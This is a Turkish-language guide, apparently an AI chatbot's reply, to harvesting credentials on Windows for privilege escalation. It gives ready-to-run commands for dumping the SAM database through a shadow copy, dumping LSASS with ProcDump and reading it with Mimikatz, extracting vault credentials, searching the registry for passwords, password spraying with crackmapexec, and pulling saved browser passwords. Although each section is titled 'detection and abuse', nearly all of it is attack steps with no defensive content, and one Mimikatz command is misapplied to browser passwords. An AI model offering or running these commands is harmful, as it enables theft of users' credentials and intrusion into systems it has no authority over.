**Windows Privilege Escalation: Credential Harvesting (Kimlik Bilgisi Toplama)**

Credential harvesting, Windows sistemlerinde saklanan kullanıcı adları ve şifrelerin ele geçirilmesini hedefleyen yöntemleri içerir. Bu bilgiler, genellikle sistem üzerindeki şifreli dosyalardan, bellekten veya diğer kaynaklardan elde edilebilir. Aşağıda bu yöntemleri detaylı şekilde açıklıyorum:

---

### **3.1. SAM Database Dump (SAM Veritabanını Ele Geçirme)**

Windows, kullanıcı şifre hash'lerini **SAM (Security Account Manager)** veritabanında saklar. Bu veritabanı ele geçirilip hash değerleri kırılarak şifreler öğrenilebilir.

#### **Nasıl Çalışır?**
- **SAM** dosyası `C:\Windows\System32\config\SAM` yolunda bulunur. Ancak, bu dosyaya doğrudan erişim için SYSTEM yetkileri gerekir.

#### **Tespit ve Kötüye Kullanma**
1. SAM dosyasını almak için:
   - **Metasploit** kullanarak:
     ```cmd
     load kiwi
     creds_all
     ```
   - **Volume Shadow Copy** ile SAM dump:
     ```cmd
     vssadmin create shadow /for=C:
     copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
     ```
2. **John the Ripper** veya **hashcat** ile hash kırma işlemi yapılabilir.

---

### **3.2. LSASS Process Dumping (Bellek Dump ile Şifre Ele Geçirme)**

LSASS (Local Security Authority Subsystem Service) işlemi, kullanıcı oturum açma bilgilerini RAM'de saklar. Bu işlem dump edilerek şifreler veya hash'ler ele geçirilebilir.

#### **Tespit ve Kötüye Kullanma**
1. **Task Manager** ile LSASS işlemini kontrol edin.
2. **ProcDump** veya **Mimikatz** kullanarak dump alın:
   - LSASS dump almak için:
     ```cmd
     procdump.exe -ma lsass.exe lsass.dmp
     ```
   - Dump dosyasını **Mimikatz** ile analiz edin:
     ```cmd
     mimikatz.exe
     sekurlsa::minidump lsass.dmp
     sekurlsa::logonpasswords
     ```

---

### **3.3. Credential Manager ve Vault (Kimlik Yöneticisi ve Kasası)**

Windows Credential Manager, kullanıcı adı ve şifreleri saklar. Bu bilgiler genellikle erişilebilir durumdadır.

#### **Nasıl Çalışır?**
- Credential Manager, web uygulamaları veya uzak sunucular için kaydedilmiş kimlik bilgilerini içerir.

#### **Tespit ve Kötüye Kullanma**
- **cmdkey** komutu ile mevcut kimlik bilgilerini görüntüleme:
  ```cmd
  cmdkey /list
  ```
- Mimikatz ile credential extraction:
  ```cmd
  mimikatz.exe
  vault::list
  vault::cred
  ```

---

### **3.4. Registry Stored Credentials (Kayıt Defterinde Saklanan Kimlik Bilgileri)**

Bazı uygulamalar ve servisler şifreleri kayıt defterinde düz metin veya şifrelenmiş olarak saklar.

#### **Tespit ve Kötüye Kullanma**
- Kayıt defterini arayın:
  ```cmd
  reg query HKLM /f password /t REG_SZ /s
  reg query HKCU /f password /t REG_SZ /s
  ```
- Özellikle aşağıdaki yolları kontrol edin:
  - `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
  - `HKCU\Software\Microsoft\Credentials`

---

### **3.5. Network Stored Credentials (Ağda Saklanan Kimlik Bilgileri)**

Bazı sistemler ağ paylaşımı sırasında kimlik bilgilerini hatırlar. Bu bilgiler, saldırgan tarafından ele geçirilebilir.

#### **Tespit ve Kötüye Kullanma**
1. Saklanan ağ kimlik bilgilerini kontrol edin:
   ```cmd
   net use
   ```
2. Kimlik bilgilerini görüntüleyin:
   ```cmd
   rundll32.exe keymgr.dll,KRShowKeyMgr
   ```

---

### **3.6. Password Spraying ve Bruteforce Saldırıları**

Sistemdeki kullanıcılar için yaygın şifreler denenerek kimlik bilgileri ele geçirilebilir.

#### **Tespit ve Kötüye Kullanma**
1. Kullanıcı adlarını enumerate edin (örneğin, `GetADUsers.py` ile).
2. Password spraying aracı kullanın:
   ```cmd
   crackmapexec smb [target-ip] -u users.txt -p passwords.txt
   ```

---

### **3.7. Saved Browser Passwords (Tarayıcıda Kaydedilmiş Şifreler)**

Bazı kullanıcılar tarayıcılarında şifrelerini saklar. Bu şifreler genellikle düz metin olarak erişilebilir.

#### **Tespit ve Kötüye Kullanma**
1. **NirSoft BrowserPassView** veya benzer araçlarla şifreleri çıkarın.
2. **Mimikatz** kullanarak saklanan şifreleri alın:
   ```cmd
   mimikatz.exe
   sekurlsa::logonpasswords
   ```

---

### **Araçlar ve Komutlar**
- **Mimikatz:** Şifre ve hash ele geçirmek için.
- **ProcDump:** LSASS işlemini dump etmek için.
- **NirSoft Tools:** Tarayıcı şifrelerini ve diğer kayıtlı bilgileri çıkarır.
- **Metasploit Framework:** Credential harvesting modülleri içerir.

---

Bu yöntemlerin hepsi, sistemdeki zayıf noktaları kullanarak kimlik bilgilerini ele geçirmeye odaklanır. Daha fazla detaylı bilgi veya özel bir senaryo için örneklerle devam edebilirim! 😊
